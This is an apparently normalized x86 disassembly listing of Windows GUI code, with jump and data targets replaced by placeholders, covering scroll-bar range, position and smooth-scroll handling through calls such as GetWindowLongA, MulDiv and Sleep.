mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_45e244
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418b4c
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_45eb0c
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_45eaec
mov edx [ edi + 0xc ]
mov eax ebx
call sub_45e99c
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45e294
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45e44c
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_446dcc
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_45e99c
xor edx edx
mov eax ebx
call sub_45e99c
jmp r-xdata
sub_45e2cc
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4295f4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45e338
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4295f4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45e3a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_45ead4
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_449d84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_45ead4
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_449d48
call sub_45e338
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_449d48
call sub_45e2cc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_45e44c
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_44d054
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45e484
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44d054
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_45e4b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_45e484
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_45e484
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_45e534
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44d054
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_45e4b8
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_446168
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_45e4b8
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4461ac
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45e5cc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44d054
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_45e62c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_45e7fd ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45e534
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45e534
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_45e99c
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
push ebp
call sub_45e5cc
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
push ebp
call sub_45e5cc
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406ba0
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45e99c
jmp r-xdata
sub_45e924
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_45f014
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_45e99c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_44d054
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_44d054
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_44cc0c
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_44cc0c
jmp r-xdata
call sub_45e10c
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_45ea60
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_45f014
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_45eb18
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44d054
push eax
call sub_42bffc
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44d054
push eax
call sub_42bffc
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44d054
push eax
call sub_42bffc
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_423458
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44d054
push eax
call sub_42bffc
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44d054
push eax
call sub_42bffc
sub_45ec20
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_45e534
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_45e534
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_45eb18
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44d054
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_45e99c
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_45e534
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_45ed38
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448d80
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e1b4
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e1b4
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_45edb0
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403270
mov eax [ esi + 0x20c ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_448ea4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_45edfc
push ebx
mov ebx eax
mov eax ebx
call sub_44a00c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_45f014
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bee0
test al al
jne r-xdata
mov eax ebx
call sub_44d054
push eax
call sub_42c030
sub_45ee3c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45ef94
mov ecx edi
mov edx esi
mov eax ebx
call sub_449754
pop edi
pop esi
pop ebx
retn
sub_45ee7c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45ef84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_446168
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_45e44c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_449d84
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_45e99c
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_449d48
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_449d48
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_4183f4
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_445ed4
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ef8b
mov eax [ ebp - 0x10 ]
call sub_403270
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45e294
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_418550
xor ecx ecx
mov edx 0xb03e
call sub_44790c
inc ebx
dec esi
jne r-xdata
sub_45efb8
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45eaec
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45eaec
mov eax ebx
call sub_45ef94
jmp r-xdata
sub_45f014
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44d358
test al al
je r-xdata
xor eax eax
push ebp
push sub_45f0ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_45e5b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45e5b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_45ec20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_45ec20
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_45ec20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_45ec20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_45ec20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_45ec20
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_45f124
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_44627c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4462a8
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_44627c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4462a8
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_446168
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45e99c
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_446168
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_4461ac
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45e99c
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_446168
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_45e99c
mov eax ebx
call sub_446168
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_4461ac
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_4461ac
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_45e99c
mov eax ebx
call sub_4461ac
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_45f278
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45e99c
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45e99c
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_45eaec
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_45eaec
sub_45f31c
push ebx
push esi
push edi
